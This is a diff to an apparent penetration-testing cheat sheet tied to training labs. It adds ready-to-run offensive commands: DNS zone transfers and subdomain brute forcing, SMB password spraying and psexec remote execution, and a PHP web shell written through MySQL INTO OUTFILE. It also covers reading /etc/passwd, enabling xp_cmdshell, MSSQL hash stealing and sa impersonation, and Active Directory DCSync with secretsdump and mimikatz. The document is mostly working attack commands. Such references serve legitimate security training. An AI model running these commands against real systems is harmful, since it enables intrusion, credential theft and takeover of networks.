@@ -247,12 +247,22 @@ dig ns <domain.tld> @<nameserver>
 # ANY request to the specific nameserver
 dig any <domain.tld> @<nameserver>
 
-# AXFR request to the specific nameserver.
+# AXFR request to the specific nameserver. (Zone Transfer)
 dig axfr <domain.tld> @<nameserver>
+dig axfr internal.<domain.tld> @<nameserver/IP>
+
+#Subdomain Brute Forcing
+for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
+
+#DNSenum
+dnsenum --dnsserver <IP> --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt <domain.tld>
 ```
 
 ##### IMAP POP3
 ```
+# Footprinting
+sudo nmap <IP> -sV -p110,143,996,995 -sC
+
 # Log in to the IMAPS service using cURL
 curl -k 'imaps://<FQDN/IP>' --user <user>:<password>
 
@@ -261,10 +271,57 @@ openssl s_client -connect <FQDN/IP>:imaps
 
 # Connect to the POP3s service
 openssl s_client -connect <FQDN/IP>:pop3s
+
+# Connect with creds
+curl -k 'imaps://<IP>' --user <user:password>
+
+# IMAP Commands
+| **Command**                     | **Description**                                                                                               |
+| ------------------------------- | ------------------------------------------------------------------------------------------------------------- |
+| `1 LOGIN username password`     | User's login.                                                                                                 |
+| `1 LIST "" *`                   | Lists all directories.                                                                                        |
+| `1 CREATE "INBOX"`              | Creates a mailbox with a specified name.                                                                      |
+| `1 DELETE "INBOX"`              | Deletes a mailbox.                                                                                            |
+| `1 RENAME "ToRead" "Important"` | Renames a mailbox.                                                                                            |
+| `1 LSUB "" *`                   | Returns a subset of names from the set of names that the User has declared as being `active` or `subscribed`. |
+| `1 SELECT INBOX`                | Selects a mailbox so that messages in the mailbox can be accessed.                                            |
+| `1 UNSELECT INBOX`              | Exits the selected mailbox.                                                                                   |
+| `1 FETCH <ID> all`              | Retrieves data associated with a message in the mailbox.                                                      |
+| `1 CLOSE`                       | Removes all messages with the `Deleted` flag set.                                                             |
+| `1 LOGOUT`                      | Closes the connection with the IMAP server.                                                                   |
+
+# POP3 Commands
+| **Command**     | **Description**                                             |
+| --------------- | ----------------------------------------------------------- |
+| `USER username` | Identifies the user.                                        |
+| `PASS password` | Authentication of the user using its password.              |
+| `STAT`          | Requests the number of saved emails from the server.        |
+| `LIST`          | Requests from the server the number and size of all emails. |
+| `RETR id`       | Requests the server to deliver the requested email by ID.   |
+| `DELE id`       | Requests the server to delete the requested email by ID.    |
+| `CAPA`          | Requests the server to display the server capabilities.     |
+| `RSET`          | Requests the server to reset the transmitted information.   |
+| `QUIT`          | Closes the connection with the POP3 server.                 |
+
+# Dangerous Settings
+| **Setting**               | **Description**                                                                           |
+| ------------------------- | ----------------------------------------------------------------------------------------- |
+| `auth_debug`              | Enables all authentication debug logging.                                                 |
+| `auth_debug_passwords`    | This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged.  |
+| `auth_verbose`            | Logs unsuccessful authentication attempts and their reasons.                              |
+| `auth_verbose_passwords`  | Passwords used for authentication are logged and can also be truncated.                   |
+| `auth_anonymous_username` | This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism. |
 ```
 
 #### SNMP
 ```
+# Dangerous Settings
+| **Settings**                                     | **Description**                                                                       |
+| ------------------------------------------------ | ------------------------------------------------------------------------------------- |
+| `rwuser noauth`                                  | Provides access to the full OID tree without authentication.                          |
+| `rwcommunity <community string> <IPv4 address>`  | Provides access to the full OID tree regardless of where the requests were sent from. |
+| `rwcommunity6 <community string> <IPv6 address>` | Same access as with `rwcommunity` with the difference of using IPv6.                  |
+
 # Querying OIDs using snmpwalk
 snmpwalk -v2c -c <community string> <FQDN/IP>
 
@@ -273,6 +330,8 @@ onesixtyone -c community-strings.list <FQDN/IP>
 
 # Bruteforcing SNMP service OIDs.
 braa <community string>@<FQDN/IP>:.1.*
+# Braa Example
+braa public@<FQDN/IP>:.1.3.6.*
 ```
 ##### MSSQL
 ```
@@ -390,6 +449,9 @@ smbmap -H 10.129.14.128
 # Null-session with the rpcclient.
 rpcclient -U'%' 10.10.110.17
 
+# Brute Forcing & Password Spray
+crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p '<password>' --local-auth
+
 # Execute a command over the SMB service using crackmapexec.
 crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
 
@@ -401,10 +463,35 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
 
 # Execute a PowerShell based reverse shell using impacket-ntlmrelayx.
 impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>
+
+# Impacket PsExec - RCE
+impacket-psexec administrator:'<password>'@10.10.110.17
+
+# smbexec (atexec also applies)
+crackmapexec smb 10.10.110.17 -u Administrator -p '<password>' -x 'whoami' --exec-method smbexec
+
 ```
 ##### Attacking SQL
 ```
-# SQLEXPRESS
+# Connect to SQL sever (MySQL)
+mysql -u <username> -p<password> -h <IP>
+
+# Sqlcmd - Connect to SQL server
+sqsh -S <IP> -U <username> -P '<password>' -h
+
+# Using Impacket
+impacket-mssqlclient -p 1433 user@IP
+
+# Check if you can read/write data
+show variables like "secure_file_priv";
+
+# If you can write local files
+mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+
+# Read local files
+mysql> select LOAD_FILE("/etc/passwd");
+
+# SQLEXPRESS - enable xp_cmdshell
 EXECUTE sp_configure 'show advanced options', 1
 EXECUTE sp_configure 'xp_cmdshell', 1
 RECONFIGURE
@@ -412,12 +499,45 @@ xp_cmdshell 'whoami'
 
 # Hash stealing using the xp_dirtree command in MSSQL.
 EXEC master..xp_dirtree '\\10.10.110.17\share\'
+GO
 
 # Hash stealing using the xp_subdirs command in MSSQL.
 EXEC master..xp_subdirs '\\10.10.110.17\share\'
+GO
+
+# XP_SUBDIRS Hash Stealing with impacket
+sudo impacket-smbserver share ./ -smb2support
+
+# Identify linked Servers in MSSQL
+1> SELECT srvname, isremote FROM sysservers
+2> GO
+
+srvname                             isremote
+----------------------------------- --------
+DESKTOP-MFERMN4\SQLEXPRESS          1
+10.0.0.12\SQLEXPRESS                0
 
 # Identify the user and its privileges used for the remote connection in MSSQL.
 EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+
+# ID users to impersonate
+1> SELECT distinct b.name
+2> FROM sys.server_permissions a
+3> INNER JOIN sys.server_principals b
+4> ON a.grantor_principal_id = b.principal_id
+5> WHERE a.permission_name = 'IMPERSONATE'
+6> GO
+
+# Verify Current User Role
+1> SELECT SYSTEM_USER
+2> SELECT IS_SRVROLEMEMBER('sysadmin')
+3> go
+
+#Impersonate the SA User
+1> EXECUTE AS LOGIN = 'sa'
+2> SELECT SYSTEM_USER
+3> SELECT IS_SRVROLEMEMBER('sysadmin')
+4> GO
 ```
 ##### Attacking Email Services
 ```
@@ -449,7 +569,7 @@ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --
 # Performs a ping sweep on the specified network segment from a Linux-based host
 fping -asgq 172.16.5.0/23
 
-# Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.
+# Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dc using a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.
 ./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
 ```
 ##### LLMNR Poisoning
@@ -459,8 +579,8 @@ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
 ```
 ##### Password Spraying and Password Policies
 ```
-# Uses CME to extract  password policy
-crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
+# Uses NXC to extract  password policy
+netexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
 
 # Uses rpcclient to discover information about the domain through SMB NULL sessions. Performed from a Linux-based host.
 rpcclient -U "" -N 172.16.5.5
@@ -480,8 +600,8 @@ Get-DomainPolicy
 # Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.
 rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser
 
-# Uses CrackMapExec to discover users (--users) in a target Windows domain from a Linux-based host.
-crackmapexec smb 172.16.5.5 --users
+# Uses NetExec to discover users (--users) in a target Windows domain from a Linux-based host.
+netexec smb 172.16.5.5 --users
 
 # Uses ldapsearch to discover users in a target Windows doman, then filters the output using grep to show only the sAMAccountName from a Linux-based host.
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
@@ -489,8 +609,8 @@ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclas
 # Uses kerbrute and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host.
 kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
 
-# Uses CrackMapExec and the --local-auth flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using grep.
-sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+# Uses NetExec and the --local-auth flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using grep.
+sudo netexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
 
 # Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.
 Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
@@ -607,11 +727,24 @@ Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
 
 ##### ACL Enumeration and Tactics
 ```
+# Create list of Domain Users
+Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
+
 # PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.
 Find-InterestingDomainAcl
 
 # Used to import PowerView and retrieve the SID of aspecific user account (wley) from a Windows-based host.
-Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley
+Import-Module .\PowerView.ps1
+$sid = Convert-NameToSid wley
+
+# Using Get-DomainObjectACL
+Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+# Add ResovleGUIDs flag for mapping GUID to a value in human readable form
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+# Perform Reverse Search & Map to a GUID value
+PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
+PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
 
 # Used to create a PSCredential Object from a Windows-based host.
 $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
@@ -628,17 +761,26 @@ Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
 
 # PowerView tool used create a fake Service Principal Name given a sepecift user (adunn) from a Windows-based host.
 Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+
+# Check for reversible encryption option using Get-DomainUser
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+
 ```
 
 ##### DCSync Attack
 ```
 # PowerView tool used to view the group membership of a specific user (adunn) in a target Windows domain. Performed from a Windows-based host.
-Get-DomainUser -Identity adunn | sel
-ect samaccountname,objectsid,memberof,useraccountcontrol |fl
+Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol |fl
+
+# Use Get-ObjectAcl to check user's replication rights
+$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
+Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+
+# Extract NTLM Hashes and Kerberos Keys using secretsdump
+secretsdump.py -outputfile domain_hashes -just-dc <DOMAIN>/<user>@<IP>
 
 # Uses Mimikatz to perform a dcsync attack from a Windows-based host.
 mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
-
 
 # Uses the PowerShell cmd-let Enter-PSSession to establish a PowerShell session with a target over the network (-ComputerName ACADEMY-EA-DB01) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior ($cred & $password).
 Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
